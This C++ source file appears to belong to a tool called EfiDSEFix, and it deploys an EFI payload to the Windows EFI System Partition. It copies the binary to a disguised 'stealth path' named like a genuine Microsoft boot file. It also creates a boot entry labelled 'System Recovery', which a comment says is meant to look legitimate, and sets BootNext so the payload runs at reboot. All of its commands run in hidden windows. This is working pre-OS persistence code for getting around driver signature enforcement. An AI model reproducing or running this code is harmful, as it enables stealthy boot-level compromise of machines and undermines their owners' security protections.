/**
 * EspDeploy.cpp - ESP Partition Deployment Module
 * 
 * Uses Windows system commands for ESP deployment:
 * - mountvol S: /s - Mount ESP partition
 * - copy - Deploy EFI file
 * - bcdedit - Create boot entry and set BootNext
 * - mountvol S: /d - Unmount ESP
 */

#include "EfiDSEFix.h"
#include <ntstatus.h>
#include <strsafe.h>

// Stealth path on ESP partition
#define ESP_STEALTH_PATH L"\\EFI\\Microsoft\\Boot\\bootstat.efi"
#define ESP_DRIVE_LETTER L"S:"

// BCD entry description (appears legitimate)
#define BCD_ENTRY_DESCRIPTION L"System Recovery"

//
// Execute a system command and return status
//
static
NTSTATUS
ExecuteCommand(
    _In_ PCWSTR CommandLine,
    _Out_opt_ PBOOL Success
    )
{
    if (Success != nullptr)
        *Success = FALSE;
    
    // Use CreateProcess with hidden window
    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    PROCESS_INFORMATION pi = {0};
    
    // CreateProcess modifies the command line, so make a copy
    WCHAR CmdBuffer[1024];
    StringCchCopyW(CmdBuffer, ARRAYSIZE(CmdBuffer), L"cmd.exe /c ");
    StringCchCatW(CmdBuffer, ARRAYSIZE(CmdBuffer), CommandLine);
    
    BOOL Created = CreateProcessW(
        NULL,
        CmdBuffer,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi);
    
    if (!Created)
        return STATUS_UNSUCCESSFUL;
    
    // Wait for completion
    WaitForSingleObject(pi.hProcess, 30000);  // 30 second timeout
    
    DWORD ExitCode = 0;
    GetExitCodeProcess(pi.hProcess, &ExitCode);
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    if (Success != nullptr)
        *Success = (ExitCode == 0);
    
    return (ExitCode == 0) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
}

//
// Execute bcdedit and capture GUID output
//
static
NTSTATUS
ExecuteBcdCreate(
    _Out_ PWCHAR GuidBuffer,
    _In_ ULONG GuidBufferLen
    )
{
    // Create temp file to capture output
    WCHAR TempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, TempPath);
    
    WCHAR TempFile[MAX_PATH];
    StringCchPrintfW(TempFile, ARRAYSIZE(TempFile), L"%sbcdedit_output.txt", TempPath);
    
    // bcdedit /create /d "System Recovery" /application startup
    WCHAR CmdLine[512];
    StringCchPrintfW(CmdLine, ARRAYSIZE(CmdLine),
        L"bcdedit /create /d \"%s\" /application startup > \"%s\" 2>&1",
        BCD_ENTRY_DESCRIPTION, TempFile);
    
    BOOL Success = FALSE;
    ExecuteCommand(CmdLine, &Success);
    
    // Read output to extract GUID
    HANDLE hFile = CreateFileW(TempFile, GENERIC_READ, FILE_SHARE_READ, NULL, 
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        DeleteFileW(TempFile);
        return STATUS_UNSUCCESSFUL;
    }
    
    CHAR Buffer[512] = {0};
    DWORD BytesRead = 0;
    ReadFile(hFile, Buffer, sizeof(Buffer) - 1, &BytesRead, NULL);
    CloseHandle(hFile);
    DeleteFileW(TempFile);
    
    // Parse GUID from output (format: "The entry {GUID} was successfully created.")
    PCHAR GuidStart = strchr(Buffer, '{');
    PCHAR GuidEnd = strchr(Buffer, '}');
    
    if (GuidStart == NULL || GuidEnd == NULL || GuidEnd <= GuidStart)
        return STATUS_NOT_FOUND;
    
    // Convert to wide string
    SIZE_T GuidLen = GuidEnd - GuidStart + 1;
    if (GuidLen >= GuidBufferLen)
        return STATUS_BUFFER_TOO_SMALL;
    
    for (SIZE_T i = 0; i <= GuidLen; i++)
        GuidBuffer[i] = (WCHAR)GuidStart[i];
    GuidBuffer[GuidLen] = L'\0';
    
    return STATUS_SUCCESS;
}

//
// Deploy EFI to ESP partition and set BootNext
//
NTSTATUS
DeployEfiToEsp(
    _In_ PCWSTR EfiSourcePath
    )
{
    NTSTATUS Status;
    BOOL Success = FALSE;
    WCHAR BcdGuid[64] = {0};
    
    Printf(L"[Deploy] Starting ESP deployment...\n");
    
    // Step 1: Mount ESP partition
    Printf(L"[Deploy] Mounting ESP partition to %s...\n", ESP_DRIVE_LETTER);
    Status = ExecuteCommand(L"mountvol " ESP_DRIVE_LETTER L" /s", &Success);
    if (!Success)
    {
        Printf(L"[Deploy] Failed to mount ESP partition.\n");
        return STATUS_ACCESS_DENIED;
    }
    
    // Step 2: Create target directory if needed
    WCHAR TargetDir[MAX_PATH];
    StringCchPrintfW(TargetDir, ARRAYSIZE(TargetDir), L"%s\\EFI\\Microsoft\\Boot", ESP_DRIVE_LETTER);
    CreateDirectoryW(TargetDir, NULL);  // Ignore error, may already exist
    
    // Step 3: Copy EFI file to ESP
    WCHAR TargetPath[MAX_PATH];
    StringCchPrintfW(TargetPath, ARRAYSIZE(TargetPath), L"%s%s", ESP_DRIVE_LETTER, ESP_STEALTH_PATH);
    Printf(L"[Deploy] Copying %s to %s...\n", EfiSourcePath, TargetPath);
    
    if (!CopyFileW(EfiSourcePath, TargetPath, FALSE))
    {
        Printf(L"[Deploy] Failed to copy EFI file: 0x%08X\n", GetLastError());
        ExecuteCommand(L"mountvol " ESP_DRIVE_LETTER L" /d", NULL);
        return STATUS_UNSUCCESSFUL;
    }
    
    // Step 4: Create BCD entry
    Printf(L"[Deploy] Creating BCD entry...\n");
    Status = ExecuteBcdCreate(BcdGuid, ARRAYSIZE(BcdGuid));
    if (!NT_SUCCESS(Status))
    {
        Printf(L"[Deploy] Failed to create BCD entry.\n");
        DeleteFileW(TargetPath);
        ExecuteCommand(L"mountvol " ESP_DRIVE_LETTER L" /d", NULL);
        return Status;
    }
    Printf(L"[Deploy] Created BCD entry: %s\n", BcdGuid);
    
    // Step 5: Configure BCD entry
    WCHAR CmdLine[512];
    
    // Set device
    StringCchPrintfW(CmdLine, ARRAYSIZE(CmdLine), L"bcdedit /set %s device partition=" ESP_DRIVE_LETTER, BcdGuid);
    ExecuteCommand(CmdLine, &Success);
    if (!Success)
        Printf(L"[Deploy] Warning: Failed to set device.\n");
    
    // Set path
    StringCchPrintfW(CmdLine, ARRAYSIZE(CmdLine), L"bcdedit /set %s path %s", BcdGuid, ESP_STEALTH_PATH);
    ExecuteCommand(CmdLine, &Success);
    if (!Success)
        Printf(L"[Deploy] Warning: Failed to set path.\n");
    
    // Step 6: Set BootNext
    Printf(L"[Deploy] Setting BootNext to %s...\n", BcdGuid);
    StringCchPrintfW(CmdLine, ARRAYSIZE(CmdLine), L"bcdedit /set {fwbootmgr} bootnext %s", BcdGuid);
    Status = ExecuteCommand(CmdLine, &Success);
    if (!Success)
    {
        Printf(L"[Deploy] Failed to set BootNext.\n");
        // Cleanup BCD entry
        StringCchPrintfW(CmdLine, ARRAYSIZE(CmdLine), L"bcdedit /delete %s", BcdGuid);
        ExecuteCommand(CmdLine, NULL);
        DeleteFileW(TargetPath);
        ExecuteCommand(L"mountvol " ESP_DRIVE_LETTER L" /d", NULL);
        return STATUS_UNSUCCESSFUL;
    }
    
    // Step 7: Unmount ESP
    Printf(L"[Deploy] Unmounting ESP...\n");
    ExecuteCommand(L"mountvol " ESP_DRIVE_LETTER L" /d", NULL);
    
    Printf(L"[Deploy] Deployment successful!\n");
    Printf(L"[Deploy] BCD Entry: %s\n", BcdGuid);
    Printf(L"[Deploy] Reboot to activate.\n");
    
    return STATUS_SUCCESS;
}

//
// Clean up ESP deployment (recovery function)
//
NTSTATUS
CleanupEspDeployment(
    VOID
    )
{
    BOOL Success = FALSE;
    
    Printf(L"[Cleanup] Starting cleanup...\n");
    
    // Mount ESP
    Printf(L"[Cleanup] Mounting ESP partition...\n");
    ExecuteCommand(L"mountvol " ESP_DRIVE_LETTER L" /s", &Success);
    if (!Success)
    {
        Printf(L"[Cleanup] Failed to mount ESP. Manual cleanup may be required.\n");
        return STATUS_ACCESS_DENIED;
    }
    
    // Delete the EFI file
    WCHAR TargetPath[MAX_PATH];
    StringCchPrintfW(TargetPath, ARRAYSIZE(TargetPath), L"%s%s", ESP_DRIVE_LETTER, ESP_STEALTH_PATH);
    
    if (DeleteFileW(TargetPath))
        Printf(L"[Cleanup] Deleted %s\n", TargetPath);
    else
        Printf(L"[Cleanup] Note: %s not found or already deleted.\n", TargetPath);
    
    // Clear BootNext (optional, firmware does this automatically)
    Printf(L"[Cleanup] Clearing BootNext...\n");
    ExecuteCommand(L"bcdedit /deletevalue {fwbootmgr} bootnext", NULL);
    
    // Note: We cannot easily delete the orphaned BCD entry without knowing its GUID.
    // RWbase.sys should handle this after kernel init.
    Printf(L"[Cleanup] Note: Orphaned BCD entry may remain. Use 'bcdedit /enum firmware' to check.\n");
    
    // Unmount
    ExecuteCommand(L"mountvol " ESP_DRIVE_LETTER L" /d", NULL);
    
    Printf(L"[Cleanup] Cleanup complete.\n");
    return STATUS_SUCCESS;
}

//
// Check ESP deployment status
//
NTSTATUS
CheckEspDeploymentStatus(
    VOID
    )
{
    BOOL Success = FALSE;
    
    Printf(L"[Status] Checking deployment status...\n");
    
    // Mount ESP
    ExecuteCommand(L"mountvol " ESP_DRIVE_LETTER L" /s", &Success);
    if (!Success)
    {
        Printf(L"[Status] Cannot mount ESP. Admin privileges required.\n");
        return STATUS_ACCESS_DENIED;
    }
    
    // Check if file exists
    WCHAR TargetPath[MAX_PATH];
    StringCchPrintfW(TargetPath, ARRAYSIZE(TargetPath), L"%s%s", ESP_DRIVE_LETTER, ESP_STEALTH_PATH);
    
    DWORD Attrs = GetFileAttributesW(TargetPath);
    if (Attrs != INVALID_FILE_ATTRIBUTES)
    {
        Printf(L"[Status] EFI file present: %s\n", TargetPath);
        
        // Get file size
        WIN32_FILE_ATTRIBUTE_DATA FileInfo = {0};
        if (GetFileAttributesExW(TargetPath, GetFileExInfoStandard, &FileInfo))
        {
            Printf(L"[Status] File size: %u bytes\n", FileInfo.nFileSizeLow);
        }
    }
    else
    {
        Printf(L"[Status] EFI file not deployed.\n");
    }
    
    // Unmount
    ExecuteCommand(L"mountvol " ESP_DRIVE_LETTER L" /d", NULL);
    
    // Check BootNext
    Printf(L"\n[Status] Current BootNext setting:\n");
    ExecuteCommand(L"bcdedit /enum firmware | findstr /i bootnext", NULL);
    
    return STATUS_SUCCESS;
}
